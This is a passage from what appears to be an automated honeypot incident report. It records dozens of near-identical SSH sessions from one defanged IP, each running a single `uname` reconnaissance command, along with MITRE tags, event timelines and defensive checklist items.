| `2026-08-08 17:08:06` | `cowrie.session.connect` |
| `2026-08-08 17:08:06` | `cowrie.client.version` |
| `2026-08-08 17:08:06` | `cowrie.client.kex` |
| `2026-08-08 17:08:07` | `cowrie.login.success` |
| `2026-08-08 17:08:08` | `cowrie.session.params` |
| `2026-08-08 17:08:08` | `cowrie.command.input` |
| `2026-08-08 17:08:08` | `cowrie.log.closed` |
| `2026-08-08 17:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d098e53030c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:08:12` | `cowrie.session.connect` |
| `2026-08-08 17:08:12` | `cowrie.client.version` |
| `2026-08-08 17:08:12` | `cowrie.client.kex` |
| `2026-08-08 17:08:13` | `cowrie.login.success` |
| `2026-08-08 17:08:14` | `cowrie.session.params` |
| `2026-08-08 17:08:14` | `cowrie.command.input` |
| `2026-08-08 17:08:15` | `cowrie.log.closed` |
| `2026-08-08 17:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498ca5e26ff6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:08:18` | `cowrie.session.connect` |
| `2026-08-08 17:08:18` | `cowrie.client.version` |
| `2026-08-08 17:08:18` | `cowrie.client.kex` |
| `2026-08-08 17:08:19` | `cowrie.login.success` |
| `2026-08-08 17:08:20` | `cowrie.session.params` |
| `2026-08-08 17:08:20` | `cowrie.command.input` |
| `2026-08-08 17:08:20` | `cowrie.log.closed` |
| `2026-08-08 17:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-178fd84156a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:08:24` | `cowrie.session.connect` |
| `2026-08-08 17:08:24` | `cowrie.client.version` |
| `2026-08-08 17:08:24` | `cowrie.client.kex` |
| `2026-08-08 17:08:25` | `cowrie.login.success` |
| `2026-08-08 17:08:26` | `cowrie.session.params` |
| `2026-08-08 17:08:26` | `cowrie.command.input` |
| `2026-08-08 17:08:26` | `cowrie.log.closed` |
| `2026-08-08 17:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61197cfd752d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:08:31` | `cowrie.session.connect` |
| `2026-08-08 17:08:31` | `cowrie.client.version` |
| `2026-08-08 17:08:31` | `cowrie.client.kex` |
| `2026-08-08 17:08:32` | `cowrie.login.success` |
| `2026-08-08 17:08:32` | `cowrie.session.params` |
| `2026-08-08 17:08:32` | `cowrie.command.input` |
| `2026-08-08 17:08:33` | `cowrie.log.closed` |
| `2026-08-08 17:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e073fe2f12c1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:08:38` | `cowrie.session.connect` |
| `2026-08-08 17:08:38` | `cowrie.client.version` |
| `2026-08-08 17:08:38` | `cowrie.client.kex` |
| `2026-08-08 17:08:38` | `cowrie.login.success` |
| `2026-08-08 17:08:39` | `cowrie.session.params` |
| `2026-08-08 17:08:39` | `cowrie.command.input` |
| `2026-08-08 17:08:39` | `cowrie.log.closed` |
| `2026-08-08 17:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f80e242fe1e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:08:44` | `cowrie.session.connect` |
| `2026-08-08 17:08:44` | `cowrie.client.version` |
| `2026-08-08 17:08:44` | `cowrie.client.kex` |
| `2026-08-08 17:08:45` | `cowrie.login.success` |
| `2026-08-08 17:08:46` | `cowrie.session.params` |
| `2026-08-08 17:08:46` | `cowrie.command.input` |
| `2026-08-08 17:08:46` | `cowrie.log.closed` |
| `2026-08-08 17:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89cbc7fc6633

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:08:52` | `cowrie.session.connect` |
| `2026-08-08 17:08:52` | `cowrie.client.version` |
| `2026-08-08 17:08:52` | `cowrie.client.kex` |
| `2026-08-08 17:08:52` | `cowrie.login.success` |
| `2026-08-08 17:08:53` | `cowrie.session.params` |
| `2026-08-08 17:08:53` | `cowrie.command.input` |
| `2026-08-08 17:08:53` | `cowrie.log.closed` |
| `2026-08-08 17:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7932e2af9aab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:08:57` | `cowrie.session.connect` |
| `2026-08-08 17:08:58` | `cowrie.client.version` |
| `2026-08-08 17:08:58` | `cowrie.client.kex` |
| `2026-08-08 17:08:58` | `cowrie.login.success` |
| `2026-08-08 17:08:59` | `cowrie.session.params` |
| `2026-08-08 17:08:59` | `cowrie.command.input` |
| `2026-08-08 17:08:59` | `cowrie.log.closed` |
| `2026-08-08 17:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b878658fac34

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:05` | `cowrie.session.connect` |
| `2026-08-08 17:09:05` | `cowrie.client.version` |
| `2026-08-08 17:09:05` | `cowrie.client.kex` |
| `2026-08-08 17:09:05` | `cowrie.login.success` |
| `2026-08-08 17:09:06` | `cowrie.session.params` |
| `2026-08-08 17:09:06` | `cowrie.command.input` |
| `2026-08-08 17:09:06` | `cowrie.log.closed` |
| `2026-08-08 17:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bbe03c16731

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:11` | `cowrie.session.connect` |
| `2026-08-08 17:09:11` | `cowrie.client.version` |
| `2026-08-08 17:09:11` | `cowrie.client.kex` |
| `2026-08-08 17:09:12` | `cowrie.login.success` |
| `2026-08-08 17:09:12` | `cowrie.session.params` |
| `2026-08-08 17:09:12` | `cowrie.command.input` |
| `2026-08-08 17:09:13` | `cowrie.log.closed` |
| `2026-08-08 17:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57db6b15b58b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:17` | `cowrie.session.connect` |
| `2026-08-08 17:09:17` | `cowrie.client.version` |
| `2026-08-08 17:09:17` | `cowrie.client.kex` |
| `2026-08-08 17:09:18` | `cowrie.login.success` |
| `2026-08-08 17:09:19` | `cowrie.session.params` |
| `2026-08-08 17:09:19` | `cowrie.command.input` |
| `2026-08-08 17:09:20` | `cowrie.log.closed` |
| `2026-08-08 17:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d29b5e48cf4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:24` | `cowrie.session.connect` |
| `2026-08-08 17:09:24` | `cowrie.client.version` |
| `2026-08-08 17:09:24` | `cowrie.client.kex` |
| `2026-08-08 17:09:24` | `cowrie.login.success` |
| `2026-08-08 17:09:25` | `cowrie.session.params` |
| `2026-08-08 17:09:25` | `cowrie.command.input` |
| `2026-08-08 17:09:25` | `cowrie.log.closed` |
| `2026-08-08 17:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eeb9baf22b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:29` | `cowrie.session.connect` |
| `2026-08-08 17:09:29` | `cowrie.client.version` |
| `2026-08-08 17:09:29` | `cowrie.client.kex` |
| `2026-08-08 17:09:30` | `cowrie.login.success` |
| `2026-08-08 17:09:31` | `cowrie.session.params` |
| `2026-08-08 17:09:31` | `cowrie.command.input` |
| `2026-08-08 17:09:31` | `cowrie.log.closed` |
| `2026-08-08 17:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8320fd8a963b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:37` | `cowrie.session.connect` |
| `2026-08-08 17:09:37` | `cowrie.client.version` |
| `2026-08-08 17:09:37` | `cowrie.client.kex` |
| `2026-08-08 17:09:37` | `cowrie.login.success` |
| `2026-08-08 17:09:38` | `cowrie.session.params` |
| `2026-08-08 17:09:38` | `cowrie.command.input` |
| `2026-08-08 17:09:38` | `cowrie.log.closed` |
| `2026-08-08 17:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-670a3bfd5900

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:44` | `cowrie.session.connect` |
| `2026-08-08 17:09:44` | `cowrie.client.version` |
| `2026-08-08 17:09:44` | `cowrie.client.kex` |
| `2026-08-08 17:09:45` | `cowrie.login.success` |
| `2026-08-08 17:09:46` | `cowrie.session.params` |
| `2026-08-08 17:09:46` | `cowrie.command.input` |
| `2026-08-08 17:09:46` | `cowrie.log.closed` |
| `2026-08-08 17:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78fd96ca2183

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:51` | `cowrie.session.connect` |
| `2026-08-08 17:09:51` | `cowrie.client.version` |
| `2026-08-08 17:09:51` | `cowrie.client.kex` |
| `2026-08-08 17:09:51` | `cowrie.login.success` |
| `2026-08-08 17:09:52` | `cowrie.session.params` |
| `2026-08-08 17:09:52` | `cowrie.command.input` |
| `2026-08-08 17:09:53` | `cowrie.log.closed` |
| `2026-08-08 17:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7197c99f6b1f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:09 |
| **Last Seen** | 2026-08-08 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:09:56` | `cowrie.session.connect` |
| `2026-08-08 17:09:56` | `cowrie.client.version` |
| `2026-08-08 17:09:56` | `cowrie.client.kex` |
| `2026-08-08 17:09:57` | `cowrie.login.success` |
| `2026-08-08 17:09:58` | `cowrie.session.params` |
| `2026-08-08 17:09:58` | `cowrie.command.input` |
| `2026-08-08 17:09:58` | `cowrie.log.closed` |
| `2026-08-08 17:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-044f94f43581

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:02` | `cowrie.session.connect` |
| `2026-08-08 17:10:02` | `cowrie.client.version` |
| `2026-08-08 17:10:02` | `cowrie.client.kex` |
| `2026-08-08 17:10:03` | `cowrie.login.success` |
| `2026-08-08 17:10:04` | `cowrie.session.params` |
| `2026-08-08 17:10:04` | `cowrie.command.input` |
| `2026-08-08 17:10:04` | `cowrie.log.closed` |
| `2026-08-08 17:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c868b831e0bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:08` | `cowrie.session.connect` |
| `2026-08-08 17:10:08` | `cowrie.client.version` |
| `2026-08-08 17:10:08` | `cowrie.client.kex` |
| `2026-08-08 17:10:09` | `cowrie.login.success` |
| `2026-08-08 17:10:11` | `cowrie.session.params` |
| `2026-08-08 17:10:11` | `cowrie.command.input` |
| `2026-08-08 17:10:11` | `cowrie.log.closed` |
| `2026-08-08 17:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31f467087a26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:15` | `cowrie.session.connect` |
| `2026-08-08 17:10:15` | `cowrie.client.version` |
| `2026-08-08 17:10:15` | `cowrie.client.kex` |
| `2026-08-08 17:10:16` | `cowrie.login.success` |
| `2026-08-08 17:10:17` | `cowrie.session.params` |
| `2026-08-08 17:10:17` | `cowrie.command.input` |
| `2026-08-08 17:10:17` | `cowrie.log.closed` |
| `2026-08-08 17:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbae514551f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:21` | `cowrie.session.connect` |
| `2026-08-08 17:10:21` | `cowrie.client.version` |
| `2026-08-08 17:10:21` | `cowrie.client.kex` |
| `2026-08-08 17:10:22` | `cowrie.login.success` |
| `2026-08-08 17:10:22` | `cowrie.session.params` |
| `2026-08-08 17:10:22` | `cowrie.command.input` |
| `2026-08-08 17:10:22` | `cowrie.log.closed` |
| `2026-08-08 17:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4868d2f1423a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:27` | `cowrie.session.connect` |
| `2026-08-08 17:10:27` | `cowrie.client.version` |
| `2026-08-08 17:10:27` | `cowrie.client.kex` |
| `2026-08-08 17:10:28` | `cowrie.login.success` |
| `2026-08-08 17:10:29` | `cowrie.session.params` |
| `2026-08-08 17:10:29` | `cowrie.command.input` |
| `2026-08-08 17:10:29` | `cowrie.log.closed` |
| `2026-08-08 17:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f954481e168

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:34` | `cowrie.session.connect` |
| `2026-08-08 17:10:34` | `cowrie.client.version` |
| `2026-08-08 17:10:34` | `cowrie.client.kex` |
| `2026-08-08 17:10:35` | `cowrie.login.success` |
| `2026-08-08 17:10:35` | `cowrie.session.params` |
| `2026-08-08 17:10:35` | `cowrie.command.input` |
| `2026-08-08 17:10:36` | `cowrie.log.closed` |
| `2026-08-08 17:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e79aee6f65

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:41` | `cowrie.session.connect` |
| `2026-08-08 17:10:41` | `cowrie.client.version` |
| `2026-08-08 17:10:41` | `cowrie.client.kex` |
| `2026-08-08 17:10:42` | `cowrie.login.success` |
| `2026-08-08 17:10:43` | `cowrie.session.params` |
| `2026-08-08 17:10:43` | `cowrie.command.input` |
| `2026-08-08 17:10:43` | `cowrie.log.closed` |
| `2026-08-08 17:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68c296785198

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:10 |
| **Last Seen** | 2026-08-08 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:10:48` | `cowrie.session.connect` |
| `2026-08-08 17:10:48` | `cowrie.client.version` |
| `2026-08-08 17:10:48` | `cowrie.client.kex` |
| `2026-08-08 17:10:48` | `cowrie.login.success` |
| `2026-08-08 17:10:49` | `cowrie.session.params` |
| `2026-08-08 17:10:49` | `cowrie.command.input` |
| `2026-08-08 17:10:49` | `cowrie.log.closed` |
| `2026-08-08 17:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9bb6740ac4d

| Field | Detail |
|---|---|
